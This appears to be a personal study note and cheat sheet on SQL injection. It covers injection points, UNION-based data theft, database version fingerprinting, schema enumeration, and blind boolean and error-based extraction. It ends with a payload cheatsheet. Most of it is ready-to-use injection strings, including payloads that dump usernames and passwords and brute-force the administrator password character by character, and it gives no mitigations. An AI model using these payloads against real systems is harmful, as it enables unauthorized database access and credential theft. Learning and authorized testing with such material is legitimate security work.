# SQL Injection

**Definition**: Web security vulnerability that allows interfering with database queries.

## Common Locations

- `WHERE` clause in `SELECT`
    
- `UPDATE` statements (values/`WHERE`)
    
- `INSERT` statements (values)
    
- `SELECT` (table/column names)
    
- `SELECT` (`ORDER BY` clause)
    

## Basic Examples

Original:  
`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Injected:  
`SELECT * FROM products WHERE category = 'Gifts' OR '1'='1' -- AND released = 1`

## UNION Attacks

Append additional queries:  
`SELECT a, b FROM table1 UNION SELECT c, d FROM table2`

### Techniques

1. **Find column count**:  
    `' UNION SELECT NULL--` (Oracle: `' UNION SELECT NULL FROM DUAL--`)
    
2. **Check column types**:  
    `' UNION SELECT NULL,'a',NULL,NULL--`
    
3. **Steal data**:  
    `'UNION SELECT username,password FROM users--`
    
4. **Combine fields**:  
    `' UNION SELECT username||'~'||password FROM users--`
    

## Database Version

- **MySQL/MSSQL**: `' UNION SELECT @@version--`
    
- **Oracle**: `' UNION SELECT * FROM v$version--`
    
- **PostgreSQL**: `' UNION SELECT version()--`
    

## Database Enumeration

1. **List tables**:  
    `SELECT * FROM information_schema.tables`
    
2. **List columns**:  
    `SELECT * FROM information_schema.columns WHERE table_name='Users'`
    
3. **Practical injection**:  
    `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='Users'--`
    
# Blind SQL Injection (Blind SQLi)
Definition: Attack where app is vulnerable to SQLi but doesn't show query results in HTTP responses.

## Techniques:
1. Conditional Responses:
   - Basic checks: 
     xyz' AND '1'='1 (true)
     xyz' AND '1'='2 (false)
   - Char-by-char extraction:
     xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username='Administrator'),1,1) > 'm'
     xyz' AND SUBSTRING((...),1,1) = 's'

2. Password Length:
   ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)<10)='administrator'--

3. Bruteforce Password:
   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
   (Use Burp Intruder to automate)

## Error-Based SQLi:
- Conditional Errors:
  xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a' (no error)
  xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a' (error)

- Data Extraction:
  xyz' AND (SELECT CASE WHEN (Username='Admin' AND SUBSTRING(Password,1,1)>'m') THEN 1/0 ELSE 'a' END FROM Users)='a'
  (Error = true condition)

## Summary:
1. Boolean-Based: Check true/false responses
2. Time-Based: Induce delays (SLEEP(), WAITFOR)
3. Error-Based: Force DB errors
4. OOB: Exfiltrate via DNS/HTTP
## Payload Cheatsheet


```
OR '1'='1' --  
OR '1'='1' #  
UNION SELECT NULL--  
' UNION SELECT @@version--  
' UNION SELECT table_name FROM information_schema.tables--  
```